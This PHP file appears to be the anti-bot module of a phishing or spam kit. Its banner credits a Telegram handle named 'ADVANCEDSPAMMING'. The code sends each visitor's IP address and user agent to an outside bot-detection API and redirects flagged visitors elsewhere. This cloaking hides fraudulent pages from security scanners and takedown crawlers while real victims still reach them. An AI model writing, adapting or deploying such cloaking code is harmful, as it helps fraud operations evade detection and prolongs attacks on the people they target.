<?php 
/*  
````````````````````````````````````````````````````````````````````````````````
``````````````````````````````````CODER INFO````````````````````````````````````
````````````````````````````````````````````````````````````````````````````````
``````````````````````````TELEGRAM: @ADVANCEDSPAMMING```````````````````````````
````````````````````````````````````````````````````````````````````````````````
````````````````````````````````.-/+osyyyso+/-.`````````````````````````````````
``````````````````````````````:oyhhhhhhhhhhhhhyo:```````````````````````````````
````````````````````````````/yhhhhhhhhhhhhhhhhhhhy/`````````````````````````````
``````````````````````````.shhhhhhhhhhhhhhhhhhhhhhhs.```````````````````````````
`````````````````````````.yhhhhhhhhhhhhhhhhhhhhhhhhhy.``````````````````````````
`````````````````````````shhhhhhhhhhhhhhhhhhhhhhhhhhhs``````````````````````````
``````````````````+++++`-hhhhhhhhhhhhhhhhhhhhhhhhhhhhh-`+++++```````````````````
`````````````````.hhhhh`/hhhhhhhhhhhhhhhhhhhhhhhhhhhhh+`hhhhh.``````````````````
`````````````````.hhhy+`/hhhhhhhhhhhhhhhhhhhhhhhhhhhhh/`+yhhh.``````````````````
`````````````````.hhh+``.hhhhhhyo++shhhhhhhs++oshhhhhh-``+hhh.``````````````````
`````````````````.hhh+```+hhhy.`````/hhhhh+`````.shhho```+hhh.``````````````````
`````````````````.hhh+```.hhho``````/hhhhho``````/hhh.```+hhh.``````````````````
`````````````````.hhh+````hhhho::/+shhh+hhhyo/::ohhhh````+hhh.``````````````````
`````````````````.hhh+```+hhhhhhhhhhhh+`/hhhhhhhhhhhh+```+hhh.``````````````````
`````````````````.hhh+```-shhhhhhhhhhs```ohhhhhhhhhhs-```+hhh.``````````````````
`````````````````.hhh+`````-ohhyhhhhhhhhhhhhhhhyhho-`````+hhh.``````````````````
`````````````````.hhh+``````````.yhhhhhhhhhhhy.``````````+hhh.``````````````````
`````````````````.hhh+```````````ohhhhhhhhhhho```````````+hhh.``````````````````
`````````````````.hhh+```````````+yhhhhhhhhhy+```````````+hhh.``````````````````
`````````````````.hhh+````````````....---....````````````+hhh.``````````````````
`````````````````.hhhyoooooooooooooooooooooooooooooooooooyhhh.``````````````````
`````````````````.yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy.``````````````````
```````````.::::::///////////////.............///////////////::::::.````````````
```````````:hhhhhhhhhhhhhhhhhhhhho///////////ohhhhhhhhhhhhhhhhhhhhh/````````````
````````````/yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy/`````````````
`````````````.....................................................``````````````
````````````````````````````````````````````````````````````````````````````````
*/
function antibot_pw_is_bot( $mode, $api_key, $ip_address ){
    if ( $mode == false ) return false;

    if ( $_SESSION['ANTIBOT_PW_CHECKED'] == true ) return false;

    $antibot_pw_api_json = 
        json_decode( 
            file_get_contents( 
                'https://antibot.pw/api/v2-blockers?ip=' . $ip_address . 
                '&apikey=' . $api_key . 
                '&ua=' . urlencode( $_SERVER['HTTP_USER_AGENT'] ) ) );
    
    if ( $antibot_pw_api_json->is_bot == true || $antibot_pw_api_json->block_access == true ) { return true; } 
  else { $_SESSION['ANTIBOT_PW_CHECKED'] = true; }; 
}

if ( antibot_pw_is_bot( $antibot_pw_api['mode'], $antibot_pw_api['api_key'], $ip_address ) == true ){ 
    header( "HTTP/1.1 301 Moved Permanently" );
    header( "location: " . $antibot['redirect_url'] ); 
    exit(); }
?>